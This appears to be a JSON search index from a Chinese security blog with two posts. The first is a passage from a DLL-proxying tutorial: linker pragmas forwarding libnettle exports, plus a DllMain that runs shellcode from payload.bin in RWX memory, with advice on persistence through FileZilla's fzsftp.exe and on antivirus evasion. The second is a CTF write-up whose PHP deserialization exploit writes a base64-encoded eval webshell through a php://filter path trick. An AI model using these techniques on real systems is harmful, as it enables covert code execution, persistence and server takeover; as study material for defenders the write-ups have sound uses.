&quot;/export:nettle_sha512_init=tmp2BF5.nettle_sha512_init,@428&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_update=tmp2BF5.nettle_sha512_update,@429&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_decrypt_message=tmp2BF5.nettle_siv_cmac_aes128_decrypt_message,@430&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_encrypt_message=tmp2BF5.nettle_siv_cmac_aes128_encrypt_message,@431&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_set_key=tmp2BF5.nettle_siv_cmac_aes128_set_key,@432&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_decrypt_message=tmp2BF5.nettle_siv_cmac_aes256_decrypt_message,@433&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_encrypt_message=tmp2BF5.nettle_siv_cmac_aes256_encrypt_message,@434&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_set_key=tmp2BF5.nettle_siv_cmac_aes256_set_key,@435&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_decrypt_message=tmp2BF5.nettle_siv_cmac_decrypt_message,@436&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_encrypt_message=tmp2BF5.nettle_siv_cmac_encrypt_message,@437&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_set_key=tmp2BF5.nettle_siv_cmac_set_key,@438&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128=tmp2BF5.nettle_twofish128,@439&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128_set_key=tmp2BF5.nettle_twofish128_set_key,@440&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192=tmp2BF5.nettle_twofish192,@441&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192_set_key=tmp2BF5.nettle_twofish192_set_key,@442&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256=tmp2BF5.nettle_twofish256,@443&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256_set_key=tmp2BF5.nettle_twofish256_set_key,@444&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_decrypt=tmp2BF5.nettle_twofish_decrypt,@445&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_encrypt=tmp2BF5.nettle_twofish_encrypt,@446&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_set_key=tmp2BF5.nettle_twofish_set_key,@447&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_digest=tmp2BF5.nettle_umac128_digest,@448&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_key=tmp2BF5.nettle_umac128_set_key,@449&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_nonce=tmp2BF5.nettle_umac128_set_nonce,@450&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_update=tmp2BF5.nettle_umac128_update,@451&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_digest=tmp2BF5.nettle_umac32_digest,@452&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_key=tmp2BF5.nettle_umac32_set_key,@453&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_nonce=tmp2BF5.nettle_umac32_set_nonce,@454&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_update=tmp2BF5.nettle_umac32_update,@455&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_digest=tmp2BF5.nettle_umac64_digest,@456&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_key=tmp2BF5.nettle_umac64_set_key,@457&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_nonce=tmp2BF5.nettle_umac64_set_nonce,@458&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_update=tmp2BF5.nettle_umac64_update,@459&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_digest=tmp2BF5.nettle_umac96_digest,@460&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_key=tmp2BF5.nettle_umac96_set_key,@461&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_nonce=tmp2BF5.nettle_umac96_set_nonce,@462&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_update=tmp2BF5.nettle_umac96_update,@463&quot;)#pragma comment(linker, &quot;/export:nettle_version_major=tmp2BF5.nettle_version_major,@464&quot;)#pragma comment(linker, &quot;/export:nettle_version_minor=tmp2BF5.nettle_version_minor,@465&quot;)#pragma comment(linker, &quot;/export:nettle_xrealloc=tmp2BF5.nettle_xrealloc,@466&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_decrypt_message=tmp2BF5.nettle_xts_aes128_decrypt_message,@467&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_encrypt_message=tmp2BF5.nettle_xts_aes128_encrypt_message,@468&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_decrypt_key=tmp2BF5.nettle_xts_aes128_set_decrypt_key,@469&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_encrypt_key=tmp2BF5.nettle_xts_aes128_set_encrypt_key,@470&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_decrypt_message=tmp2BF5.nettle_xts_aes256_decrypt_message,@471&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_encrypt_message=tmp2BF5.nettle_xts_aes256_encrypt_message,@472&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_decrypt_key=tmp2BF5.nettle_xts_aes256_set_decrypt_key,@473&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_encrypt_key=tmp2BF5.nettle_xts_aes256_set_encrypt_key,@474&quot;)#pragma comment(linker, &quot;/export:nettle_xts_decrypt_message=tmp2BF5.nettle_xts_decrypt_message,@475&quot;)#pragma comment(linker, &quot;/export:nettle_xts_encrypt_message=tmp2BF5.nettle_xts_encrypt_message,@476&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_fast_reseed=tmp2BF5.nettle_yarrow256_fast_reseed,@477&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_init=tmp2BF5.nettle_yarrow256_init,@478&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_is_seeded=tmp2BF5.nettle_yarrow256_is_seeded,@479&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_needed_sources=tmp2BF5.nettle_yarrow256_needed_sources,@480&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_random=tmp2BF5.nettle_yarrow256_random,@481&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_seed=tmp2BF5.nettle_yarrow256_seed,@482&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_slow_reseed=tmp2BF5.nettle_yarrow256_slow_reseed,@483&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_update=tmp2BF5.nettle_yarrow256_update,@484&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_estimate=tmp2BF5.nettle_yarrow_key_event_estimate,@485&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_init=tmp2BF5.nettle_yarrow_key_event_init,@486&quot;)DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;}BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} Domagic函数从payload.bin中读取shellcode，之后使用virtualmalloc和malloc函数分配相应大小的内存空间，再将指针指向对应的空间执行shellcode 12345678910111213141516171819202122232425DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;} Dllmain函数为dll函数的入口 12345678910111213141516171819202122232425BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} 原文章的原理如下图 A：fzsftp.exe B:tmp2BF5.dll(正常的libnettle-8.dll文件) C:恶意libnettle-8.dll E:payload.bin 存储shellcode 实际操作中用cs直接生成的shellcode已经被杀软识别，因此免杀效果很差，将shellcode分离后远程加载并进行加密后才可以实现免杀。在实战中可以根据目标机器上安装的软件生成dll文件并替换，实现权限维持 参考 https://cloud.tencent.com/developer/article/1739263 https://github.com/Flangvik/SharpDllProxy https://gist.github.com/securitytube/c956348435cc90b8e1f7","link":"/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/"},{"title":"2020 新春红包题1","text":"[2020 新春红包题]1可以看到B类中有一个危险函数file_put_contents，只要能控制文件名和文件内容就可以写入webshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phperror_reporting(0);class A { protected $store; protected $key; protected $expire; public function __construct($store, $key = 'flysystem', $expire = null) { $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path =&gt; $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); } public function save() { $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); } public function __destruct() { if (!$this-&gt;autosave) { $this-&gt;save(); } }}class B { protected function getExpireTime($expire): int { return (int) $expire; } public function getCacheKey(string $name): string { // 使缓存文件名随机 $cache_filename = $this-&gt;options['prefix'] . uniqid() . $name; if(substr($cache_filename, -strlen('.php')) === '.php') { die('?'); } return $cache_filename; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&gt;options['serialize']; return $serialize($data); } public function set($name, $value, $expire = null): bool{ $this-&gt;writeTimes++; if (is_null($expire)) { $expire = $this-&gt;options['expire']; } $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // 创建失败 } } $data = $this-&gt;serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } $data = &quot;&lt;?php\\n//&quot; . sprintf('%012d', $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) { return $filename; } return null; }}if (isset($_GET['src'])){ highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){ mkdir($dir);}unserialize($_GET[&quot;data&quot;]); 文件名A类的key属性作为参数传入set函数 key属性传入set方法后作为$name传入getCachekey方法，返回$filename后作为file_put_contents函数的文件名参数 B类的getCacheKey方法。文件名由$this-&gt;options['prefix'] . uniqid() . $name拼接而成，uniqid()为随机生成的一串数字，同时取最后四位看是否等于.php。只要利用linux目录解析特性传入/../shell.php/.这种形式即可绕过后缀名限制 文件内容1.A类的__destruct()方法触发save方法 2.A类的save方法调用set方法，令store属性等于B类触发set，写入的文件内容$content等于getForStorage方法返回值,we 3.A类的getForStorage方法， 4.A类的cleanContents方法，接收一个数组为参数，array_intersect_key取两个数组的子集，把它们的键值交换后返回，这里就要求cache必须为一个数组 5.B类的serialize方法，返回$serialize($dara)，可以使$this-&gt;options[‘serialize’]等于serialize 6.set方法中文件内容$data被拼接上了&lt;?php exit();。由于file_put_contents的第一个参数可以为php伪协议，这样我们就可以设置file_put_contents的第一个参数为php://fliter/write=convert.base64-decode，第二个参数为base64编码后的一句话，这样前面的拼接上的&lt;?php exit();就会被转换成乱码。 cache属性的处理过程，最终作为文件内容参数传入file_put_contents 1serialize(json_encode(cleanContents($this-&gt;cache))) 利用构造exp 1234567891011121314151617181920212223242526272829&lt;?phpclass A{ protected $store; protected $key; protected $expire; public $cache =[]; public $complete = true; public function __construct () { $this-&gt;store = new B(); $this-&gt;key = '/../1.php/.'; $this-&gt;cache = ['dirname'=&gt;'aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+']; }}class B{ public $options = [ 'serialize' =&gt; 'serialize', 'prefix' =&gt; 'php://filter/write=convert.base64-decode/resource=./uploads/', ];}$a = new A();echo urlencode(serialize($a));?&gt; 成功写入文件 拿到flag","link":"/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/"}],"tags":[],"categories":[]}